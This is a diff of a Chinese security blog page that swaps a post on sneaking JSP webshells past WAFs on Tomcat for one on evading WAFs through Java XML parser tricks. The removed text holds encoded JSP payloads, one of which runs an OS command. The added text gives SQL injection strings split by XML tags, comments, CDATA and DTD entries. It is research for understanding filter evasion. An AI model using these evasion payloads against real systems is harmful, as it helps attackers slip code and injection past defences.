@@ -152,95 +152,97 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-WAF_Bypass之wesbhell上传-jsp与tomcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-WAF_Bypass之XML解析-上" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/">WAF_Bypass之wesbhell上传-jsp与tomcat</a>
+      <a class="article-title" href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/">WAF_Bypass之XML解析-上</a>
     </h1>
   
 
         
-        <a href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/" class="archive-article-date">
-  	<time datetime="2020-07-09T09:46:51.516Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-09</time>
+        <a href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/" class="archive-article-date">
+  	<time datetime="2020-06-28T12:28:55.016Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="1-开个头"><a href="#1-开个头" class="headerlink" title="1.开个头"></a>1.开个头</h1><p>事情是这样的，某一天，笔者闲着无聊，对着Tomcat的示例文件到处点点，希望寻找出点什么，意外发现Tomcat的示例文件中一些有趣的示例：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/tomcat_jsp_xml_example.png" alt></p>
-<p>随后笔者翻开Tomcat的解析代码，对其进行了一番静态代码审阅，果然有蹊跷，后面又调试看了看。</p>
-<h1 id="2-代码要点简析"><a href="#2-代码要点简析" class="headerlink" title="2 代码要点简析"></a>2 代码要点简析</h1><p>对于脚本jsp文件，会通过EncodingDetector进行字符集类型的探测，该处代码要点较多，也是主逻辑，所以整片代码放上来了。</p>
-<p>apache-tomcat-9.0.35/lib/jasper.jar!/org/apache/jasper/compiler/ParserController.class：determineSyntaxAndEncoding</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/determineSyntaxAndEncoding2.png" alt></p>
-<p>编码探测过程在该类初始化方法中进行，首先会使用processBom方法，根据文件的前4个字节探测字符集类型，这里的代码和xerces的Magic Charset中的字符集类型探测代码有着异曲同工之妙…；之后会使用getPrologEncoding方法尝试获取文件的declare charset，declare charset优先级高于magic charset。</p>
-<p>apache-tomcat-9.0.35/lib/jasper.jar!/org/apache/jasper/compiler/EncodingDetector.class</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/EncodingDetector.png" alt></p>
-<p>processBom方法会调用parseBom方法根据文件头4个字节返回字符集类型：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/processBom.png" alt></p>
-<p>getPrologEncoding将文件流传入xml解析，底层还是用的xerces，如果编码类型为xerces不支持的，这里会暂时忽略掉异常。</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPrologEncoding.png" alt></p>
-<p>但并非processBom或getPrologEncoding得到的字符集就能被成功，后续创建字符流读取器会检查自身是否支持这些字符集。</p>
-<p>这一步中也会做字符集别名的映射查找，一番操作过后，如果该字符集未读取器不支持的，最后会抛出异常。如UTF-32BE字符集，在getPrologEncoding方法中会抛出异常（不支持），在processBom中虽然不会抛出异常，但是其过程中得到的字符集名称为ISO-10646-UCS-4。而在InputStreamReader中不支持该字符集，也无别名映射（想想也是，ISO-10646-UCS-4这个名字根本也无法判断大端小端，而且代码流程中也没有传递大小端这一变量）。</p>
-<p>jdk1.8.0_191/src.zip!/java/nio/charset/Charset.java</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/flowToCharsetLoolup.png" alt></p>
-<p>ParserController.class：determineSyntaxAndEncoding方法中，如果文件没有带BOM，会触发getPageEncodingForJspSyntax函数流程</p>
-<p>apache-tomcat-9.0.30-src/java/org/apache/jasper/compiler/ParserController.java，getPageEncodingForJspSyntax</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPageEncodingForJspSyntax.png" alt></p>
-<p>从代码来看，指令标签有好几种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page  &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+        <p>XML系列将分为上下篇，本篇为上篇，主要讲述目前的原理及手法，下篇将会给出实战的应用。</p>
+<p>前段时间，笔者大致阅读了JAVA的XML解析库的底层解析代码<em>xerces</em>，实际上对于JAVA来说，所有XML解析框架、解析器，最底层用的都是它，所以绕过手法比较通用。</p>
+<p>关于XML解析的研究也算是告一段落，本文也算是笔者的一篇笔记。</p>
+<h1 id="1-Charset"><a href="#1-Charset" class="headerlink" title="1. Charset"></a>1. Charset</h1><h2 id="1-1-Magic-Charset"><a href="#1-1-Magic-Charset" class="headerlink" title="1.1 Magic Charset"></a>1.1 Magic Charset</h2><p>XML文档可以通过头部标签声明版本与字符集，常见的有UTF-8、GBK、ISO-8859-1。</p>
+<p>JAVA的底层XML解析库xerces在在读取XML文档时，首先会根据XML文档的头4个字节选择对应的字符流Reader来读取XML文档，如果XML文档有XML标签头，该Reader只是用于读取XML标签头，后续的XML内容选用什么字符流Reader则会另外根据XML标签头来决定；如果XML文档没有标签头，则该Reader将会用于读取整个XML文档。</p>
+<p>根据XML文档头4个字节选择字符流读取器的关键代码位于 jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLEntityManager.java：</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/magic_charset.png" alt></p>
+<p>判断字符集的getEncodingName方法代码如下，其中UCS-4 2143、UCS-4 3412字最后是会抛异常提示不支持的字符编码。</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/flow_to_getEncodingName.png" alt></p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/getEncodingName.png" alt></p>
+<p>所以最后看来，我们可以得到下面这个表，而为了方面区分，笔者将该手法称为<strong>Magic Charset</strong>。</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/magic_bytes.png" alt></p>
+<h2 id="1-2-Declare-Charset"><a href="#1-2-Declare-Charset" class="headerlink" title="1.2 Declare Charset"></a>1.2 Declare Charset</h2><p>如果用户在XML文档的XML头标签中中通过encoding指定了字符集，后续的XML文档读取将会根据该属性值选择一个字符流读取器。</p>
+<p>最后设置Reader的关键代码位于</p>
+<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentFragmentScannerImpl.java</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/scanXMLDecl.png" alt></p>
+<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLEntityScanner.java</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/declare_charset3.png" alt></p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/declare_charset2.png" alt></p>
+<p>在这里，我们还另外需要关注一下createReader中的EncodingMap，这里对字符集名称做了别名的映射，如IBM037与CP037实际上是同一个字符集。</p>
+<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\util\EncodingMap.java：</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/EncodingMap.png" alt></p>
+<h2 id="1-3-Double-Charset"><a href="#1-3-Double-Charset" class="headerlink" title="1.3 Double Charset"></a>1.3 Double Charset</h2><p>由于magic charset与declare charset的逻辑是独立的，我们可以分别对XML头标签与XML内容使用不同的编码。</p>
+<h1 id="2-String-Split"><a href="#2-String-Split" class="headerlink" title="2. String Split"></a>2. String Split</h1><h2 id="2-1-LABEL-INSERT"><a href="#2-1-LABEL-INSERT" class="headerlink" title="2.1 LABEL INSERT"></a>2.1 LABEL INSERT</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" union select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>添加额外标签进行字符串分割：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="tag">&lt;<span class="name">foo</span>&gt;</span>foo1 foo2<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">foofoo</span>/&gt;</span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page  %&gt;</span><br></pre></td></tr></table></figure>
+<p>使用注释进行字符串分割：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="comment">&lt;!--foo--&gt;</span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>声明字符编码的方式至少有两种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageEncoding&#x3D;&quot;UTF-16be&quot;</span><br></pre></td></tr></table></figure>
+<p>使用PI标签进行字符串分割：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="php"><span class="meta">&lt;?</span>foo1 foo2 <span class="meta">?&gt;</span></span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;</span><br></pre></td></tr></table></figure>
+<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentScannerImpl.java：</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/SCANNER_STATE_START_OF_MARKUP.png" alt></p>
+<h2 id="2-2-CDATA"><a href="#2-2-CDATA" class="headerlink" title="2.2 CDATA"></a>2.2 CDATA</h2><p>使用CDATA标签进行字符串分割：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni&lt;![CDATA[o]]&gt;n select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="2-实战讲解"><a href="#2-实战讲解" class="headerlink" title="2 实战讲解"></a>2 实战讲解</h1><h2 id="2-1-charset"><a href="#2-1-charset" class="headerlink" title="2.1 charset"></a>2.1 charset</h2><p>通过阅读代码流程，我们可以得到如下表格，该表格用于Magic Charset方法，而XML的Declare Charset也可以使用，笔者在这里就不再描述了，参考笔者的关于xerces解析的文章即可 <a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">WAF Bypass之xerces解析</a>。</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/magic_charset.png" alt></p>
-<p>有如下原始JSP文件，jsp_xml.jsp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;JSP&#x2F;Page&quot;</span><br><span class="line">  version&#x3D;&quot;1.2&quot;&gt;</span><br><span class="line">&lt;jsp:directive.page contentType&#x3D;&quot;text&#x2F;html&quot;&#x2F;&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;&#x2F;jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">out.write(&quot;I&#39;m turn1tup!&quot;);</span><br><span class="line">&lt;&#x2F;jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;&#x2F;jsp:text&gt;</span><br><span class="line">&lt;&#x2F;jsp:root&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="3-DTD"><a href="#3-DTD" class="headerlink" title="3. DTD"></a>3. DTD</h1><p>值得注意的是，xstream默认关闭DTD；XMLDecoder虽然没有关闭，但是对于Weblogic XMLDecoder，由于其特色的解析流程，对于Weblogic XMLDecoder是无法利用的。</p>
+<p>这里不贴代码了，有的是来源RFC，而且代码是三个月前看的，不想找啊。</p>
+<h2 id="3-1-ATTLIST"><a href="#3-1-ATTLIST" class="headerlink" title="3.1 ATTLIST"></a>3.1 ATTLIST</h2><p>标签的属性与值，可以通过DTD进行定义，原始XML文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用DTD ATTLIST，写作：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">test</span> <span class="meta-keyword">att</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#FIXED</span> <span class="meta-string">"foo"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用HTML编码、CDATA也可以：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">test</span> <span class="meta-keyword">att</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#FIXED</span> <span class="meta-string">"&lt;![CDATA[f]]&gt;&amp;#x6f;o"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>使用UTF-16BE字符集进行编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%3C%00%3F%00x%00m%00l%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%000%00%22%00%20%00e%00n%00c%00o%00d%00i%00n%00g%00%3D%00%22%00U%00T%00F%00-%001%006%00b%00e%00%22%00%3F%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00r%00o%00o%00t%00%20%00x%00m%00l%00n%00s%00%3A%00j%00s%00p%00%3D%00%22%00h%00t%00t%00p%00%3A%00&#x2F;%00&#x2F;%00j%00a%00v%00a%00.%00s%00u%00n%00.%00c%00o%00m%00&#x2F;%00J%00S%00P%00&#x2F;%00P%00a%00g%00e%00%22%00%0A%00%20%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%002%00%22%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00d%00i%00r%00e%00c%00t%00i%00v%00e%00.%00p%00a%00g%00e%00%20%00c%00o%00n%00t%00e%00n%00t%00T%00y%00p%00e%00%3D%00%22%00t%00e%00x%00t%00&#x2F;%00h%00t%00m%00l%00%22%00&#x2F;%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00d%00e%00c%00l%00a%00r%00a%00t%00i%00o%00n%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00d%00e%00c%00l%00a%00r%00a%00t%00i%00o%00n%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00s%00c%00r%00i%00p%00t%00l%00e%00t%00%3E%00%0A%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00s%00c%00r%00i%00p%00t%00l%00e%00t%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00t%00e%00x%00t%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00t%00e%00x%00t%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00r%00o%00o%00t%00%3E%00%0A</span><br></pre></td></tr></table></figure>
-
-<p>使用CP037进行编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lo%A7%94%93%40%A5%85%99%A2%89%96%95%7E%7F%F1K%F0%7F%40%85%95%83%96%84%89%95%87%7E%7F%83%97%F0%F3%F7%7Fon%25L%91%A2%97z%99%96%96%A3%40%A7%94%93%95%A2z%91%A2%97%7E%7F%88%A3%A3%97zaa%91%81%A5%81K%A2%A4%95K%83%96%94a%D1%E2%D7a%D7%81%87%85%7F%25%40%40%A5%85%99%A2%89%96%95%7E%7F%F1K%F2%7Fn%25L%91%A2%97z%84%89%99%85%83%A3%89%A5%85K%97%81%87%85%40%83%96%95%A3%85%95%A3%E3%A8%97%85%7E%7F%A3%85%A7%A3a%88%A3%94%93%7Fan%25L%91%A2%97z%84%85%83%93%81%99%81%A3%89%96%95n%25La%91%A2%97z%84%85%83%93%81%99%81%A3%89%96%95n%25L%91%A2%97z%A2%83%99%89%97%A3%93%85%A3n%25%96%A4%A3K%A6%99%89%A3%85M%7F%C9%7D%94%40%A3%A4%99%95%F1%A3%A4%97Z%7F%5D%5E%25La%91%A2%97z%A2%83%99%89%97%A3%93%85%A3n%25L%91%A2%97z%A3%85%A7%A3n%25La%91%A2%97z%A3%85%A7%A3n%25La%91%A2%97z%99%96%96%A3n%25</span><br></pre></td></tr></table></figure>
-
-<p>编码方式可参考 <a href="https://github.com/turn1tup/scripts/blob/master/charset_test.py" target="_blank" rel="noopener">https://github.com/turn1tup/scripts/blob/master/charset_test.py</a> ：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/charset_test_py.png" alt></p>
-<p>对于以下代码，我们也可以对其进行编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(&quot;I&#x2F;&#39;m turn1tup!&quot;);  %&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用UTF-16BE编码，需带BOM标识：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%FE%FF%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-XML特性"><a href="#2-2-XML特性" class="headerlink" title="2.2 XML特性"></a>2.2 XML特性</h2><p>参考文章 <a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">WAF Bypass之xerces解析</a>，这里举一些例子：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">"http://java.sun.com/JSP/Page"</span></span><br><span class="line">  version=<span class="string">"1.2"</span>&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">"text/html"</span>/&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">&lt;![CDATA[o]]&gt;u&lt;![CDATA[t.writ]]&gt;&lt;![CDATA[e]]&gt;(<span class="string">"I'm turn1tup!"</span>);</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>HTML实体编码，包括16进制、10进制、字符实体：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">"http://java.sun.com/JSP/Page"</span></span><br><span class="line">  version=<span class="string">"1.2"</span>&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">"text/html"</span>/&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">&amp;#111;&amp;#117;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&amp;#34;&amp;#73;&amp;#39;&amp;#109;&amp;#32;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#49;&amp;#116;&amp;#117;&amp;#112;&amp;#33;&amp;#34;&amp;#41;&amp;#59;</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-PageEncoding"><a href="#2-3-PageEncoding" class="headerlink" title="2.3 PageEncoding"></a>2.3 PageEncoding</h2><p>指令标签&lt;%@方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot; %&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<p>指令标签&lt;jsp:directive.page  /&gt; 方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;&#x2F;&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<p>PageEncoding声明方式</p>
